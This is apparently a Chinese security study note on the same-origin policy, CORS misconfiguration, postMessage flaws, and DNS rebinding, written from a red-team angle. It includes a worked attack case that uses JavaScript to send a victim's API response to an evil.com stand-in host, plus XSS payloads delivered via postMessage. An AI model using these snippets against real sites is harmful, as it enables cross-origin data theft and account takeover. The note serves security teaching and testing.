## 目录

- [[#一、SOP深度解析|一、SOP深度解析]]
- [[#二、跨域访问的合法方式|二、跨域访问的合法方式]]
- [[#三、CORS配置安全分析|三、CORS配置安全分析]]
- [[#四、CORS绕过技术|四、CORS绕过技术]]
- [[#五、postMessage安全|五、postMessage安全]]
- [[#六、跨域攻击实战案例|六、跨域攻击实战案例]]
- [[#七、同源策略的漏洞与局限性|七、同源策略的漏洞与局限性]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、SOP深度解析

### 同源判定的边界

```
完整Origin：https://login.bank.com:443

同源的组成部分：
 scheme (https) + host (login.bank.com) + port (443)

判例：
 https://login.bank.com:443/page1 = 同源
 https://login.bank.com:443/page2 = 同源（路径无所谓）
 https://api.bank.com:443/ ≠ 同源（子域不同）
 http://login.bank.com:443/ ≠ 同源（协议不同）
 https://login.bank.com:8443/ ≠ 同源（端口不同）
```

### SOP的不对称性

```javascript
// 可以做的事（写操作）：
// 1. 提交表单
<form action="https://bank.com/transfer" method="POST">...</form>

// 2. 加载资源
<img src="https://bank.com/avatar.jpg">
<script src="https://bank.com/api.js"></script>

// 3. 发起请求（无法读响应）
fetch('https://bank.com/api/data', { mode: 'no-cors' });

// 不能做的事（读操作）：
// 1. 读取跨域请求的响应
fetch('https://bank.com/api/data')
 .then(r => r.json()); // ← 被CORS阻止

// 2. 读取跨域iframe内容
document.querySelector('iframe').contentDocument; // ← SOP阻止

// 3. 跨域读取cookie/localStorage
// cookie有Domain和Path限制
```

## 二、跨域访问的合法方式

### 1. CORS（最主要）

```http
# 服务器声明允许跨域
Access-Control-Allow-Origin: https://trusted.example.com
Access-Control-Allow-Credentials: true
```

### 2. JSONP（历史方式）

```html
<script src="https://api.example.com/data?callback=handleData"></script>

# 返回：handleData({"user":"admin","email":"admin@example.com"})
```

JSONP的callback函数在调用者的上下文中执行 → 可以获取数据。这本质上是对"script标签可跨域加载"这一SOP例外的利用。

### 3. postMessage

```javascript
// 发送方
iframe.contentWindow.postMessage('hello', 'https://target.com');

// 接收方
window.addEventListener('message', (event) => {
 if (event.origin !== 'https://trusted.com') return; // ← 必须验证！
 console.log(event.data);
});
```

### 4. WebSocket

```
WebSocket不受SOP限制，但服务器可检查Origin头
这也是为什么CSWSH成为重要的攻击向量
```

### 5. CORS + 代理

```
同源服务端代理：GET /proxy?url=https://external-api.com/data
服务端在自己的请求中获取外部数据，然后返回给前端
这是合法的跨域方式，也是SSRF的常见载体
```

## 三、CORS配置安全分析

### 常见CORS错误配置

**错误1：反射Origin（最危险）**
```http
# 请求头
Origin: https://evil.com

# 响应（漏洞！）
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```

**错误2：Origin校验不严格**
```javascript
// 服务器代码（Node.js）
const allowed = ['https://example.com', 'https://www.example.com'];

// 漏洞：只检查了 包含 而不是 完全匹配
if (allowed.indexOf(origin) >= 0) { ... } // 正确
if (allowed.some(a => origin.includes(a))) { ... } // 错误！

// origin = 'https://evil.com?x=https://example.com'
// origin.includes('https://example.com') → true → 绕过！
```

**错误3：null Origin**
```http
Access-Control-Allow-Origin: null

# null Origin 来自：
# - sandboxed iframe
# - data: URI
# - file:// 协议
# 攻击者可以在sandboxed iframe中利用此配置
```

**错误4：通配符 + 凭据**
```
# 错误的配置（浏览器会拒绝）
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# 浏览器行为：忽略Credentials，不回传Cookie
```

**错误5：过度宽松的预检**
```http
# 任何自定义头部都被允许
Access-Control-Allow-Headers: *

# 任何方法都被允许
Access-Control-Allow-Methods: *

# 长缓存时间
Access-Control-Max-Age: 86400 # 24小时，降低攻击检测窗口
```

## 四、CORS绕过技术

### 1. 子域接管 + CORS

```
1. 目标站点 bank.com CORS允许 *.bank.com
2. 攻击者接管了 test.bank.com 的子域（过期DNS/云服务）
3. 在 test.bank.com 上部署恶意页面
4. bank.com的CORS允许test.bank.com → 可以读取bank.com的跨域响应
```

### 2. Origin欺骗（利用空字节）

```http
Origin: https://trusted.com\@evil.com

# 某些服务器的Origin校验可能被空字节截断
# 认为Origin是 https://trusted.com
```

### 3. 利用XSS配合CORS

```
1. 发现 bank.com 有存储XSS
2. bank.com 的CORS允许 bank.com 本身
3. XSS在 bank.com 页面上执行 → 同源 → 绕过CORS
4. XSS读取 bank.com 的API响应 → 外泄到evil.com
```

### 4. 利用302重定向

```
浏览器从 evil.com → bank.com/api 的重定向会带Origin: null
如果目标CORS允许null → 绕过
```

## 五、postMessage安全

### 危险的postMessage模式

```javascript
// 危险模式1：使用通配符 *
targetWindow.postMessage(data, '*');

// 危险模式2：不验证event.origin
window.addEventListener('message', function(e) {
 // 不检查 e.origin！
 eval(e.data); // ← DOM XSS via postMessage
});

// 危险模式3：不验证消息结构
window.addEventListener('message', function(e) {
 // 只检查origin，但未检查data内容
 if (e.origin === 'https://trusted.com') {
 document.getElementById('result').innerHTML = e.data.html; // ← XSS
 }
});
```

### postMessage安全测试

```javascript
// 在攻击者页面上（evil.com）
const target = window.open('https://target.com/page');

// 尝试发送恶意消息
target.postMessage('<img src=x onerror=alert(1)>', '*');
target.postMessage({ type: 'update', content: '<svg/onload=alert(1)>' }, '*');

// 如果在target.com上弹窗了 → postMessage存在XSS漏洞
```

### 常见postMessage漏洞模式

```javascript
// 模式1：缺少origin检查
window.addEventListener('message', callback); // 无origin验证

// 模式2：正则匹配错误
if (/trusted\.com$/.test(event.origin)) {
 // eviltrusted.com 也能通过！
}

// 模式3：indexOf不够
if (event.origin.indexOf('trusted.com') > -1) {
 // nottrusted.com.evil.com 也能通过！
}
```

## 六、跨域攻击实战案例

### 案例1：CORS配置错误 → 账户接管

```
目标：api.bank.com 的 /user/profile 端点
配置：Access-Control-Allow-Origin: 反射Origin
 Access-Control-Allow-Credentials: true

攻击：
1. 受害者登录bank.com
2. 受害者访问evil.com
3. evil.com执行：
 fetch('https://api.bank.com/user/profile', {
 credentials: 'include'
 })
 .then(r => r.json())
 .then(data => fetch('https://evil.com/steal', {
 method: 'POST',
 body: JSON.stringify(data)
 }));
4. 攻击者获取受害者的个人资料（可能含邮箱、电话等）
5. 用这些信息进行社工 / 密码重置
```

### 案例2：postMessage → 钓鱼攻击

```
目标：payment-processor.com 使用postMessage进行支付确认
漏洞：未验证 event.origin + 直接设置innerHTML

攻击：
1. 受害者访问evil.com
2. evil.com打开 https://payment-processor.com/checkout
3. evil.com发送postMessage：
 postMessage({html: '<div>付款成功！商品将发送至您地址</div>'}, '*')
4. 页面显示虚假成功消息
5. 受害者以为支付成功，实际未完成/款项转到攻击者
```

## 七、同源策略的漏洞与局限性

### SOP的已知盲区

| 盲区 | 原因 | 后果 |
|------|------|------|
| WebSocket | 不受SOP限制 | CSWSH攻击 |
| postMessage | 显式的跨域通信 | 配置错误时数据泄露 |
| DNS重绑定 | 攻击者控制DNS切换IP | 视为同源 → SOP完全绕过 |
| XSS | 在目标源内执行代码 | SOP无法防御 |
| 浏览器漏洞 | 渲染进程沙箱逃逸 | 完全绕过所有限制 |

### DNS重绑定攻击

```
1. 注册 evil.com → DNS TTL=1秒
2. 第0秒：evil.com → 攻击者IP (5.6.7.8)
 受害者加载 evil.com 页面
 页面中的JS开始polling

3. 第2秒：evil.com → 内网IP (192.168.1.1)
 DNS TTL过期，JavaScript发出新请求
 浏览器认为仍在同一"源"（evil.com）
 JS可以读取 192.168.1.1 的响应！（SOP被绕过）
```

## 八、红队视角总结

### 跨域攻击速查

| 配置 | 漏洞类型 | 利用难度 |
|------|---------|---------|
| CORS反射Origin + Credentials | 跨域数据窃取 | 低 |
| CORS允许null Origin | sandboxed iframe窃取 | 中 |
| postMessage 无origin验证 | XSS | 低 |
| postMessage 正则错误 | 跨域数据操纵 | 中 |
| WebSocket 无Origin验证 | CSWSH | 中 |
| DNS重绑定 | 内网数据窃取 | 高 |

### 检测脚本

```bash
# 检查CORS配置
curl -sI -H "Origin: https://evil.com" https://api.target.com/endpoint \
 | grep -i 'access-control'

# 如果有 Access-Control-Allow-Origin: https://evil.com
# + Access-Control-Allow-Credentials: true
# → 高危CORS配置！
```

---
**返回** [[../前端基础总目录|前端基础总目录]]
